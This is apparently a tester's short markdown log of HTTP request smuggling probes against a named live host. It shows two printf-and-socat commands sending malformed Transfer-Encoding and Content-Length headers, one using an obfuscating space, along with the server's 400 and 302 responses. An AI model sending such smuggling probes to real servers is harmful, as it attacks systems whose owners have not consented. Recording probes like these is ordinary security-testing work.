# REAL Server test

### Sending first request with [space] between Transfer-Encoding`<and>`:
```
vigneshsb@Vigneshs-MacBook-Pro HTTP-Request-Smuggling % cat <(printf "POST / HTTP/1.1\r\nHost: dev.easy.ac\r\nContent-Lenght: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\n") - | socat - SSL:dev.easy.ac:443
2024/07/11 17:04:21 socat[1377] W OpenSSL: Warning: this implementation does not check CRLs
HTTP/1.1 400 Bad Request
Date: Thu, 11 Jul 2024 11:34:22 GMT
Content-Type: text/html
Content-Length: 177
Connection: close

<html>
  <head>
    <title>Bad Request</title>
  </head>
  <body>
    <h1><p>Bad Request</p></h1>
    Invalid HTTP header name: &#x27;TRANSFER-ENCODING &#x27;
  </body>
</html>
```

sending without space:
```
vigneshsb@Vigneshs-MacBook-Pro HTTP-Request-Smuggling % cat <(printf "POST / HTTP/1.1\r\nHost: dev.easy.ac\r\nContent-Lenght: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n") - | socat - SSL:dev.easy.ac:443 
2024/07/11 17:04:34 socat[1380] W OpenSSL: Warning: this implementation does not check CRLs
HTTP/1.1 302 Found
Date: Thu, 11 Jul 2024 11:34:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: keep-alive
Server: gunicorn
Location: /en/
X-Frame-Options: SAMEORIGIN
Vary: Origin, Cookie
```
